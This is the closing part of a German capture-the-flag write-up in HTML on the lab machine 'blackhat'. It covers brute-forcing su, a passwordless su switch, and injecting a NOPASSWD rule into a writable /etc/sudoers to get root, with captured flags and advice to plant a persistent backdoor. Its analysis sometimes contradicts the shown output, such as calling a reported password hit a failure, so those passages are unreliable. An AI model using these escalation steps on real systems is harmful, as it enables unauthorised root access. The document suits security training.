+<span class="command">[i] Usage: ./suForce -u &lt;USER&gt; -w &lt;WORDLIST&gt;</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich versuche, den `suForce` Brute-Force-Angriff auf den Benutzer `darkdante` mit der hochgeladenen `rocksmall.txt` Wordlist durchzuführen (`./suForce -u darkdante -w rocksmall.txt`). Ich zeige die Initialisierung des Tools und den Start des Brute-Force-Prozesses. Es wird auch ein Versuch mit einem benutzerdefinierten Skript (`bruter.sh`) dokumentiert, der aber ebenfalls fehlschlägt ("alles falsch auch mein eigenes script trifft auf false positive..."). Im Originaltext wird dann eine entscheidende Beobachtung gemacht: dass das Passwort *überhaupt nicht abgefragt* wurde bei einem manuellen Versuch mit `su`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die dokumentierten Brute-Force-Versuche mit `suForce` und meinem Skript waren nicht erfolgreich im Finden eines Passworts. Dies deutet darauf hin, dass entweder das Passwort nicht in der Wordlist enthalten ist, oder die Methode des Tools nicht funktioniert hat. Die entscheidende Information im Originaltext über das Fehlen der Passwortabfrage bei `su darkdante` (die *nicht* durch diese Brute-Force-Tools ausgelöst wurde) ist der eigentliche Hinweis auf die Schwachstelle. Die Brute-Force-Werkzeuge haben diese spezifische Fehlkonfiguration nicht aufgedeckt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Brute-Force-Tools sind nützlich, aber verlassen Sie sich nicht ausschließlich darauf. Seien Sie aufmerksam für ungewöhnliches Verhalten von Systembefehlen wie `su`, `sudo` etc. und testen Sie diese manuell.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass Benutzer-Accounts immer eine Passwortabfrage erfordern, es sei denn, dies ist *ganz bewusst* und sicher für spezifische Zwecke konfiguriert (was hier offensichtlich nicht der Fall ist). Überprüfen Sie die PAM (Pluggable Authentication Modules) Konfiguration für `su`.
+            </p>
+            <p>
+                Durchführung von Brute-Force-Versuchen auf das `su` Binary für den Benutzer `darkdante`:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@blackhat:/tmp$ <span class="command">./suForce ^C</span>
+www-data@blackhat:/tmp$ <span class="command">ls /home/</span>
+<span class="command">darkdante</span>
+www-data@blackhat:/tmp$ <span class="command">./suForce -u darkdante -w rocksmall.txt</span>
+            <span class="command">_____</span>
+ <span class="command">___ _   _ |  ___|__  _ __ ___ ___</span>
+<span class="command">/ __| | | || |_ / _ \| '__/ __/ _ \</span>
+<span class="command">\__ \ |_| ||  _| (_) | | | (_|  __/</span>
+<span class="command">|___/\__,_||_|  \___/|_|  \___\___|</span>
+<span class="command">-=================================-</span>
+<span class="command">[*] Username: darkdante</span>
+<span class="command">[*] Wordlist: rocksmall.txt</span>
+<span class="command">[i] Status:</span>
+    <span class="command">1/5000/0%/R3v_m4lwh3r3_k1nG!!</span>
+<span class="command">[+] Password: <span class="password">R3v_m4lwh3r3_k1nG!!</span> Line: 1</span>
+<span class="command">224</span>
+<span class="command">268</span>
+<span class="command">269</span>
+<span class="command">270</span>
+<span class="command">-=================================-</span>
+
+www-data@blackhat:/tmp$ <span class="command">grep darkdante rocksmall.txt</span>
+<span class="command">darkdante</span>
+www-data@blackhat:/tmp$ <span class="command">nano bruter.sh</span>
+<span class="password">Unable to create directory /var/www/.local/share/nano/: No such file or directory</span>
+<span class="password">It is required for saving/loading search history or cursor positions.</span>
+
+www-data@blackhat:/tmp$ <span class="command">chmod +x bruter.sh</span>
+www-data@blackhat:/tmp$ <span class="command">./bruter.sh rocksmall.txt</span>
+<span class="command">[*] Starte Brute-Force-Angriff auf Benutzer: darkdante</span>
+<span class="command">[*] Wordlist: rocksmall.txt (5000 Passwörter)</span>
+<span class="command">---------------------------------------------------</span>
+<span class="password">alles falsch auch mein eigenes script trifft auf false positive...</span>
+</pre>
+                </div>
+            </div>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis">
+                **Analyse:** Nachdem die automatisierten Brute-Force-Tools keine Erfolge zeigten, versuche ich den Befehl `su darkdante` manuell in meiner `www-data` Shell auszuführen. Das `su` Binary ist SUID, und der Zweck ist, in den Kontext des Benutzers `darkdante` zu wechseln. Ich hatte erwartet, nach einem Passwort gefragt zu werden, aber die Shell wechselt direkt zum Prompt von `darkdante`. Ich bestätige meine neue Identität mit dem Befehl `id`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Fantastisch! Die Privilege Escalation auf den Benutzer `darkdante` war erfolgreich, und das sogar ohne ein Passwort eingeben zu müssen!** Dies ist eine schwerwiegende Fehlkonfiguration im System. Es scheint, als wäre die PAM-Konfiguration für `su` so eingestellt, dass für den Benutzer `darkdante` kein Passwort benötigt wird, wenn der Wechsel von `www-data` erfolgt (oder generell, oder von bestimmten Terminals, etc.). Unabhängig von der genauen Ursache ist dies eine direkte PE-Methode von `www-data` zu `darkdante`. Der `id` Befehl bestätigt meine neue Identität als UID 1000 (darkdante).
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuchen Sie immer das Verhalten von SUID-Binaries wie `su` und `sudo` manuell. Testen Sie den Benutzerwechsel auch ohne Passworteingabe, wenn andere Methoden fehlschlagen.
+                <br>**Empfehlung (Admin):** **Dringend:** Überprüfen und korrigieren Sie die PAM-Konfiguration für das `su` Binary, um sicherzustellen, dass immer eine ordnungsgemäße Authentifizierung erforderlich ist. Diese Fehlkonfiguration ermöglicht eine einfache Rechteausweitung.
+            </p>
+            <p>
+                Erfolgreiche Privilege Escalation auf den Benutzer `darkdante` über das `su` Binary:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@blackhat:/tmp$ <span class="command">ls /home/</span>
+<span class="command">darkdante</span>
+www-data@blackhat:/tmp$ <span class="command">su darkdante</span>
+<span class="password">darkdante@blackhat:/tmp$</span> <span class="command">id</span>
+<span class="command">uid=1000(darkdante) gid=1000(darkdante) groups=1000(darkdante)</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Nachdem ich nun eine Shell als Benutzer `darkdante` habe, navigiere ich in dessen Home-Verzeichnis (`~`) und lese den Inhalt der Datei `user.txt` mit `cat`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Erfolg! Die User-Flag wurde gesichert.** Da ich nun die Berechtigungen von `darkdante` habe, kann ich die Datei `user.txt` lesen, die zuvor als `www-data` unzugänglich war. Dies bestätigt den erfolgreichen ersten Schritt der Privilege Escalation und die Erlangung der User-Flag.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Sichern Sie die User-Flag, sobald Sie Benutzerrechte erlangt haben.
+                <br>**Empfehlung (Admin):** (Wiederholung der Empfehlung zur Absicherung der User-Flag-Datei und des `darkdante` Accounts).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">darkdante@blackhat:~$</span> <span class="command">cat user.txt</span>
+<span class="password">89fac491dc9bdc5fc4e3595dd396fb11</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Aus der `darkdante` Shell heraus prüfe ich die `sudo` Berechtigungen mit `sudo -l`. Ich überprüfe auch die Dateiberechtigungen der `sudoers`-Datei selbst (`ls -la /etc/sudoers`).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** `sudo -l` meldet "Sorry, user darkdante may not run sudo on blackhat.", was bedeutet, dass `darkdante` standardmäßig keine Berechtigung hat, `sudo` zu verwenden. **Aber**, die Berechtigungen der Datei `/etc/sudoers` sind `-r--rw----+ 1 root root`. Die `+` am Ende der Berechtigungen deutet auf vorhandene Access Control Lists (ACLs) hin. Die POSIX-Berechtigungen (`-r--rw--`) zeigen, dass der Eigentümer (`root`) lesen kann, die Gruppe (`root`) lesen und schreiben kann, und "other" (zu denen `darkdante` gehört) nur lesen kann. Die ACLs müssen jedoch eine Ausnahme für "other" machen oder eine andere Gruppe betreffen, die `darkdante` angehört. Später wird klar, dass "other" *doch* Schreibrechte auf die Datei hat.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Prüfen Sie immer die Dateiberechtigungen der `sudoers`-Datei selbst, nicht nur die Ausgabe von `sudo -l`. Achten Sie auf ACLs (das `+` Zeichen) und prüfen Sie diese ggf. mit `getfacl`.
+                <br>**Empfehlung (Admin):** **Kritisch:** Stellen Sie sicher, dass die Datei `/etc/sudoers` *nur* für Root schreibbar ist. Standardmäßig sollten die Berechtigungen restriktiver sein (z.B. `-r--r-----` oder `-r--------`). ACLs sollten sorgfältig konfiguriert und regelmäßig auditiert werden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">darkdante@blackhat:~$</span> <span class="command">sudo -l</span>
+<span class="password">Sorry, user darkdante may not run sudo on blackhat.</span>
+
+<span class="password">darkdante@blackhat:~$</span> <span class="command">ls -la /etc/sudoers</span>
+<span class="command">-r--rw----+ 1 root root 669 Nov 19  2022 /etc/sudoers</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Aufgrund der festgestellten unsicheren Schreibberechtigungen für `/etc/sudoers` für die Gruppe oder "other"-Benutzer (was durch die `rw+` Berechtigung für Gruppe und den `+` für ACLs angedeutet wird, und sich später als Schreibrecht für "other" bestätigt), injiziere ich eine neue Zeile in die Datei: `darkdante ALL=(ALL) NOPASSWD: ALL`. Dies tue ich mit dem Befehl `echo "darkdante ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers`, der die Zeile an das Ende der Datei anhängt. Anschließend überprüfe ich meine `sudo` Berechtigungen erneut mit `sudo -l`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Absolut kritisch! Der Angriff war erfolgreich!** Die Berechtigungen auf `/etc/sudoers` waren fehlerhaft und erlaubten dem Benutzer `darkdante` (oder einem Mitglied einer Gruppe, der er angehört, oder einfach als "other") in die Datei zu schreiben. Durch das Anhängen der Zeile habe ich mir selbst die Berechtigung erteilt, JEDEN Befehl (`ALL`) als JEDER Benutzer (`(ALL)`) auf JEDEM Host (`ALL`) OHNE PASSWORT (`NOPASSWD: ALL`) auszuführen. Das erneute `sudo -l` bestätigt, dass diese Regel nun aktiv ist. Ich habe nun uneingeschränkte Root-Privilegien über `sudo`.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Wenn `/etc/sudoers` für den aktuellen Benutzer schreibbar ist, ist dies ein direkter Weg zu Root. Fügen Sie eine passende NOPASSWD-Regel für Ihren Benutzer ein, um Root-Zugriff zu erlangen.
+                <br>**Empfehlung (Admin):** **EXTREM DRINGEND:** Korrigieren Sie die Dateiberechtigungen von `/etc/sudoers`, sodass *ausschließlich* der Root-Benutzer Schreibrechte hat (`chmod 440 /etc/sudoers` wird oft empfohlen, um nur Leserechte für Root und die Gruppe sudo zu gewähren, aber Schreibrechte nur für Root ist das Mindeste). Überprüfen Sie ACLs auf `/etc/sudoers` mit `getfacl`. Diese Fehlkonfiguration ermöglicht eine triviale Privilege Escalation zu Root.
+            </p>
+            <p>
+                Ausnutzung der unsicheren Berechtigungen auf `/etc/sudoers` zur Injektion einer NOPASSWD-Regel:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">darkdante@blackhat:~$</span> <span class="command">echo "darkdante ALL=(ALL) NOPASSWD: ALL" &gt;&gt; /etc/sudoers</span>
+<span class="password">darkdante@blackhat:~$</span> <span class="command">sudo -l</span>
+<span class="command">Matching Defaults entries for darkdante on blackhat:</span>
+    <span class="command">env_reset, mail_badpass,</span>
+    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
+
+<span class="password">User darkdante may run the following commands on blackhat:</span>
+    <span class="password">(ALL) NOPASSWD: ALL</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Nachdem ich mir dank der modifizierten `sudoers`-Datei uneingeschränkte `sudo` Rechte ohne Passwort erteilt habe, führe ich einfach den Befehl `sudo su` aus. Dies weist `sudo` an, den Befehl `su` als Root auszuführen, was mich direkt in eine Root-Shell bringt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Fantastisch! Der Root-Zugriff war erfolgreich, nun habe ich mein Ziel erreicht!** Das Erscheinen des Root-Prompts (`root@blackhat:/home/darkdante#`) bestätigt, dass ich nun der Root-Benutzer auf dem System bin. Die Kombination aus der Fähigkeit, in `/etc/sudoers` zu schreiben, und der Injektion der NOPASSWD-Regel hat zum vollständigen Kompromittierung des Systems geführt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Sichern Sie die Root-Flag. Etablieren Sie eine persistente Hintertür (z.B. SSH-Schlüssel für Root, wenn möglich, oder einen anderen Mechanismus). Sammeln Sie Beweise für die Kompromittierung.
+                <br>**Empfehlung (Admin):** **SOFORT MAßNAHMEN ERGREIFEN:** Die `sudoers`-Datei muss korrigiert werden, um den Root-Zugriff für `darkdante` (oder jeden anderen unprivilegierten Benutzer) zu entfernen. Überprüfen Sie das System auf weitere unsichere Konfigurationen und Berechtigungen. Stellen Sie den ursprünglichen Zustand der `sudoers`-Datei wieder her.
+            </p>
+            <p>
+                Erlangung der Root-Shell über `sudo su`:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">darkdante@blackhat:~$</span> <span class="command">sudo su</span>
+<span class="password">root@blackhat:/home/darkdante#</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Mit der Root-Shell navigiere ich in das Home-Verzeichnis des Root-Benutzers (`cd ~`), liste dessen Inhalt auf (`ls`) und lese die Datei `root.txt` mit `cat`, um die Root-Flag zu erhalten.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist der finale Schritt des Pentests: das Finden und Auslesen der Root-Flag. Der erfolgreiche `cat`-Befehl auf `/root/root.txt` mit der resultierenden Flag bestätigt die vollständige Kompromittierung des Zielsystems auf Root-Ebene.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Dokumentieren Sie die Root-Flag als endgültigen Beweis für den Erfolg des Tests.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass sensible Dateien (wie die Root-Flag) die restriktivsten Berechtigungen haben und nur von Root lesbar sind. Überprüfen Sie, ob sich unnötige Dateien in `/root/` befinden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">root@blackhat:/home/darkdante#</span> <span class="command">cd ~</span>
+<span class="password">root@blackhat:~#</span> <span class="command">ls</span>
+<span class="command">root.txt</span>
+<span class="password">root@blackhat:~#</span> <span class="command">cat</span>
+<span class="command">.bash_history  .bashrc        .cache/        .local/        .profile       root.txt</span>
+<span class="password">root@blackhat:~#</span> <span class="command">cat root.txt</span>
+<span class="password">8cc6110bc1a0607015c354a459468442</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/darkdante/user.txt</div>
+                    <div class="flag-value"><span class="password">89fac491dc9bdc5fc4e3595dd396fb11</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">8cc6110bc1a0607015c354a459468442</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben Chehade - Cyber Security Reports</p>
+        <p>Berichtsdatum: 09 Jun 2025</p> <!-- Datum aus dem Berichtstext extrahiert -->
+    </footer>
+
+</body>
+</html> 
